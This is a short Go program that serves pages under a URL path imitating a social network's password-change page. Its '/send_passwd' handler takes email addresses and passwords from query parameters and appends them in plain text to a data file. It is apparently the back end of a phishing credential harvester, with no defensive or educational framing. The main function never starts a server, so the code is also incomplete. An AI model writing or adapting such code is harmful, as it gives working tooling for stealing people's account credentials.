package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
)

const dataFile = "data.json"

func main() {
	http.Handle("/password_and_security/password/change", http.FileServer(http.Dir("./static")))
	http.HandleFunc("/send_passwd", mainHandler)
}

func mainHandler(w http.ResponseWriter, r *http.Request) {
	email := r.URL.Query().Get("email")
	password := r.URL.Query().Get("password")
	f, err := os.OpenFile(dataFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		log.Printf("Error handling request, error: %s", err.Error())
		return
	}
	defer func() {
		if err := f.Close(); err != nil {
			panic(err)
		}
	}()
	f.WriteString(fmt.Sprintf("\nemail:%s password:%s\n", email, password))
}
